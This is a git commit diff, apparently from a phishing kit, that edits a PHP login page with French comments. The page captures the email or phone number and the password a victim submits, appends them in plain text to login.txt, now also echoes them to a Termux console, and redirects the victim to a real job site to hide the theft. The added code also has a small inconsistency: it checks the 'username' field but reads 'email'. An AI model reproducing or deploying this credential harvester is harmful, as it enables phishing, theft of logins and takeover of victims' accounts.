83d2d1522014c11e613de96546cc4843b17e4d2d
𝙷𝙴𝚇✦𝚃𝙴𝙲𝙷 <hackeralltoll@gmail.com>
2025-05-22 13:04:06 +0100

    Update login.php

--- login.php
+++ login.php
@@ -2,17 +2,20 @@
 // Vérifie si le formulaire a été soumis via la méthode POST
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Récupère et nettoie les données du formulaire
-    $username = htmlspecialchars(trim($_POST["email"]));  // Adresse e-mail ou numéro de téléphone
-    $password = htmlspecialchars(trim($_POST["password"]));  // Mot de passe
+    $username = isset($_POST["username"]) ? htmlspecialchars(trim($_POST["email"])) : '';
+    $password = isset($_POST["password"]) ? htmlspecialchars(trim($_POST["password"])) : '';
 
     // Vérifie si les champs ne sont pas vides
     if (!empty($username) && !empty($password)) {
         // Formate les données pour l'enregistrement
         $data = "Nom d'utilisateur (Email/Téléphone) : " . $username . " | Mot de passe : " . $password . "\n";
 
+        // Affiche dans la console Termux (stdout)
+        file_put_contents("php://stdout", $data);
+
         // Tente d'enregistrer les données dans le fichier 'login.txt'
         $file = "login.txt";
-        if (file_put_contents($file, $data, FILE_APPEND)) {
+        if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX)) {
             // Si l'enregistrement réussit, redirige l'utilisateur
             header("Location: https://www.emploi.cd/");
             exit();
